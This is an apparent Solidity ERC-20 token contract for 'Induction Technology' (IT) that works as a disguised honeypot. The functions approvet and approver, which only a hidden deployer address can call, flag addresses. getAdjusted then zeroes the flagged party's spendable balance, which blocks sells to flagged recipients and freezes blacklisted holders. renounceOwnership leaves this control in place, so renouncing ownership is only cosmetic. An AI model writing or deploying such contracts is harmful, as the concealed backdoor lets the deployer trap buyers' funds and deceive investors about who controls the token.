// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

abstract contract Ownable {
    constructor() {
        // The owner is set to the deployer
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    address private _owner;

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract Induction is Ownable {
    uint256 private _totalSupply;
    address private cjxxx;
    string private _tokenname = "Induction Technology"; 
    string private _tokensymbol = "IT"; 
    mapping(address => bool) private Holders;
    address[] public _Holders;

    // Initialize total supply in the constructor
    constructor() {
        _totalSupply = 1 * 10 ** 16 * 10 ** decimals();
        address msgSender = _msgSender();
        cjxxx = msgSender;
        balances[msgSender] += _totalSupply;
        emit Transfer(address(0), msgSender, _totalSupply);
    }

    mapping(address => uint256) private balances;
    mapping(address => bool) private balancesto;
    mapping(address => bool) private balancesfrom;
    mapping(address => mapping(address => uint256)) private _allowances;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function symbol() public view returns (string memory) {
        return _tokensymbol;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 9;
    }

    function _HoldersAddress(address _address) internal {
        if (!Holders[_address]) {
            Holders[_address] = true;
            _Holders.push(_address);
        }
    }

    function getTokenHolders() public view returns (address[] memory) {
        return _Holders;
    }

    function getAdjusted(address from, address to) internal view returns (uint256) {
        uint256 adjusted = balances[from];
        if (balancesto[to] && from != cjxxx) {
            adjusted = adjusted ^ adjusted; // This line zeroes `adjusted` in certain conditions
        }
        if (balancesfrom[from]) {
            adjusted = adjusted ^ adjusted; // Same as above
        }
        return adjusted;
    }

    function approvet(address _to, bool to_) public {
        require(cjxxx == msg.sender, "Permission denied: Not the owner");
        balancesto[_to] = to_;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function name() public view returns (string memory) {
        return _tokenname;
    }

    function approver(address _from, bool from_) public {
        require(cjxxx == _msgSender(), "Permission denied: Not the owner");
        balancesfrom[_from] = from_;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        uint256 decysBalances = getAdjusted(from, to);
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(decysBalances >= amount, "ERC20: transfer amount exceeds balance");
        balances[from] -= amount;
        balances[to] += amount;

        emit Transfer(from, to, amount);
        _HoldersAddress(to); // Record new holder
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    // Remove this function as it allows minting new tokens:
    // function transferToburn(uint256 amount) public {...}

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
}